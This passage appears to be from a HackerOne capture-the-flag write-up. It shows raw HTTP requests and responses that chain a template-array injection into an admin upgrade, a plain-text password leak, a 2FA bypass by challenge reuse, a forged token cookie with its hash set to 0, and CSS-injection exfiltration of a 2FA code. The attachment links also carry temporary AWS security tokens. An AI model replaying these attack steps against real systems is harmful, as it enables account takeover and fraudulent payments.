class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\u003c/span\u003e\n\nprofile_name=sandra\u0026amp;profile_avatar=upgradeToAdmin%20tab1%20tab2%20tab3%20tab4\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis updates our cookie. Next we visit \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%3Dhome%23tab1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e/?template=home#tab1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and can see in the Burp Proxy history that a request to /admin/upgrade was made on page load.\u003c/p\u003e\n\n\u003cp\u003eTime to test this out for real. I make a request to\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/admin/report?url=\u0026lt;@base64_2\u0026gt;/?template=home\u0026amp;username=sandra.allison#tab4\u0026lt;@/base64_2\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMMXZvZUVPWWVKdGYvRWRGcXozbVVUWXFldWtmdmlVQzQxQ0FTR2V5U0w3WEMxWnltMlpjNzBISitQZ1RhZVJsNDY3TlBGbnBQY3VaTkwvSEEwTURoc3lsZy8xMVpPTHg5UDVoR21ZeUk1TlM5VlJhSCs0VGZkNFl2Ullj\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eannnnnnd...\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e19\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Report received\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThat was disappointing.\u003c/p\u003e\n\n\u003ch2 id=\"the-missing-piece\"\u003eThe missing piece\u003c/h2\u003e\n\n\u003cp\u003eI messed with this a bit on Monday and didn\u0026#39;t get anywhere. I was stuck and out of ideas. I tried to forget about it because I figured the answer would probably come to me later.\u003c/p\u003e\n\n\u003cp\u003eTuesday morning while retrying everything, I realize I overlooked something. While I had tried changing parameters to arrays already, I must have skipped this check for the template parameter in favor of looking for path traversal. Doing so now, I noticed that changing template parameter to an array still loaded the page successfully, even though changing it to garbage strings gave a blank page.\u003c/p\u003e\n\n\u003cp\u003eThen I realized that passing multiple values in the array would render \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%255B%255D%3Dlogin%26template%255B%255D%3Dticket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003emultiple templates on the same page\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eAfter a bit I figure out the correct URL to report.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/admin/report?url=\u0026lt;@base64_2\u0026gt;/?template[]=login\u0026amp;username=sandra.allison\u0026amp;template[]=ticket\u0026amp;ticket_id=3582#tab3\u0026lt;@/base64_2\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMMXZvZUVPWWVKdGYvRWRGcXozbVVUWXFldWtmdmlVQzQxQ0FTR2V5U0w3WEMxWnltMlpjNzBISitQZ1RhZVJsNDY3TlBGbnBQY3VaTkwvSEEwTURoc3lsZy8xMVpPTHg5UDVoR21ZeUk1TlM5VlJhSCs0VGZkNFl2Ullj\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eannnnnnd...\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\u003cspan class=\"na\"\u003eSet-Cookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMMXZvZUVPWWVKdGYvRWRGcXozbVVUWXFldWtmdmlVQzQxQ0FTR2V5U0w3WEMxWXZvVjl5K1gzQTlmZ1RhZVJsNDY3TlBGbnBQY3VaTkwrUkJrVlZoYy96aEtjZ043YWhwdmx2SEdwaWNKVUMrRlJkU2VCRUtkZ2I2aFlj; expires=Sun, 05-Jul-2020 18:58:11 GMT; Max-Age=2592000; path=/\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e19\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Report received\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe\u0026#39;re in. Re-visiting the homepage, a full list of users and plain-text passwords is now on tab 4.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emarten.mickos\nh\u0026amp;H5wy2Lggj*kKn4OD\u0026amp;Ype\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"back-at-app-bountypay-h1ctf-com\"\u003eBack at app.bountypay.h1ctf.com\u003c/h1\u003e\n\n\u003ch2 id=\"getting-in\"\u003eGetting in\u003c/h2\u003e\n\n\u003cp\u003eBack on the customer site, we login with the new credentials and bypass the 2FA the same way as before, re-using the same challenge and challenge answer.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e130\u003c/span\u003e\n\nusername=marten.mickos\u0026amp;password=h%26H5wy2Lggj*kKn4OD%26Ype\u0026amp;\u0026amp;challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026amp;challenge_answer=bD83Jk27dQ\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"the-new-token-cookie\"\u003eThe new \u003ccode\u003etoken\u003c/code\u003e cookie\u003c/h2\u003e\n\n\u003cp\u003eOur new token is\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003etoken=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDecoded we get.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;@base64_4\u0026gt;{\u0026quot;account_id\u0026quot;:\u0026quot;Ae8iJLkn9z\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;3616d6b2c15e50c0248b2276b484ddb2\u0026quot;}\u0026lt;@/base64_4\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd test that replacing the hash with 0 still works.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;@base64_4\u0026gt;{\u0026quot;account_id\u0026quot;:\u0026quot;Ae8iJLkn9z\u0026quot;,\u0026quot;hash\u0026quot;:0}\u0026lt;@/base64_4\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eStill works. I should have stuck with brute forcing the account id. Ae8iJLkn9z was going to be my next guess.\u003c/p\u003e\n\n\u003ch2 id=\"the-end\"\u003eThe End\u003c/h2\u003e\n\n\u003cp\u003eOn the dashboard, we select 05/2020 and click \u0026#39;Load Transactions\u0026#39;.\u003c/p\u003e\n\n\u003cp\u003eA table row appears indicating we owe Hacker 272 over $200,000!\u003c/p\u003e\n\n\u003cp\u003eThis is it! We can pay the hackers now!\u003c/p\u003e\n\n\u003cp\u003eWe click the green \u003ca href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fpay%2F17538771%2F27cd1393c170e1e97f9507a5351ea1ba\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePay\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e button. And we find the flag!\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"fireworks.gif\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/AWSHrbABJ88e54i68owHUKnK?response-content-disposition=attachment%3B%20filename%3D%22fireworks.gif%22%3B%20filename%2A%3DUTF-8%27%27fireworks.gif\u0026amp;response-content-type=image%2Fgif\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=62ece4535e8db53cc475def266c6c3626f3f02f0d4d2268e00eb0da703b14725\" data-attachment-type=\"image/gif\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/AWSHrbABJ88e54i68owHUKnK?response-content-disposition=attachment%3B%20filename%3D%22fireworks.gif%22%3B%20filename%2A%3DUTF-8%27%27fireworks.gif\u0026amp;response-content-type=image%2Fgif\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=62ece4535e8db53cc475def266c6c3626f3f02f0d4d2268e00eb0da703b14725\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"epilogue\"\u003eEpilogue\u003c/h1\u003e\n\n\u003cp\u003eActually, we hit another 2FA screen.\u003c/p\u003e\n\n\u003cp\u003eI click the \u0026#39;Send Challenge\u0026#39; button. Glancing over at the Burp history we see that the request includes a hidden parameter.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e73\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\u003c/span\u003e\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOk, we\u0026#39;ll need to use \u003ca href=\"/redirect?url=https%3A%2F%2Fmedium.com%2Fbugbountywriteup%2Fexfiltration-via-css-injection-4e999f63097d\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCSS injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eI turn one of my wordlists into a stylesheet using regex find and replace in VSCode.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"find_code_input_fields.css\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5yQCbFNitwPKas1LoKGx3ay9?response-content-disposition=attachment%3B%20filename%3D%22find_code_input_fields.css%22%3B%20filename%2A%3DUTF-8%27%27find_code_input_fields.css\u0026amp;response-content-type=text%2Fcss\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=34e831c53ab095522952dc841f84a741e43bd58e9880a6d6b4b7041066de166e\" data-attachment-type=\"text/css\"\u003efind_code_input_fields.css (F859855)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI upload it into a private GitHub gist, and swap it in for the app_style param in the request. And it doesn\u0026#39;t work. After a bit I figure out it\u0026#39;s because Gist doesn\u0026#39;t serve files with the expected Content-Type header. I use \u003ca href=\"/redirect?url=https%3A%2F%2Fraw.githack.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGitHack\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to wrap it, and it works.\u003c/p\u003e\n\n\u003cp\u003eBurp collaborator receives 7 pings for code_[1-7]. I generate another stylesheet to actually extract the values.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"grab_2fa_code.css\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wy6RpAihjCtqvNFEDh8zuKko?response-content-disposition=attachment%3B%20filename%3D%22grab_2fa_code.css%22%3B%20filename%2A%3DUTF-8%27%27grab_2fa_code.css\u0026amp;response-content-type=text%2Fcss\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=da6329e313bbf39d5b2ecebb44c325268a0f4247efebc4e54c80b7031b158861\" data-attachment-type=\"text/css\"\u003egrab_2fa_code.css (F859853)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI create another private Gist to host it and get a GitHack URL for it.\u003c/p\u003e\n\n\u003cp\u003eBurp collaborator receives 7 pings, one for each character of the code. I enter it. And the flag appears.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis was fun. Thanks.\u003c/p\u003e\n","weakness":{"id":26,"name":"Improper Access Control - 